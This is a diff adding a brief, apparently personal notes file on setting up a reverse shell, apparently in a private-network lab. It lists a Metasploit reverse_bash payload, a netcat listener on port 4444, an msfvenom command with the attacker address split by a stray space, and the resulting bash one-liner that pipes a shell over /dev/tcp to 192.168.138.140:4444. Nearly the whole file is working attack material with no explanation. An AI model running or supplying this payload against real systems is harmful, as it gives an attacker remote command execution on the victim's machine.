@@ -1,0 +1,12 @@
+cmd/unix/reverse_bash
+
+nc.exe -l -p 4444
+
+msfvenom.bat -p cmd/unix/reverse_bash LHOST=192.168. 138.140
+
+
+0<&188-;exec 188<>/dev/tcp/192.168.138.140/4444;sh <&188 >&188 2>&188
+
+
+
+
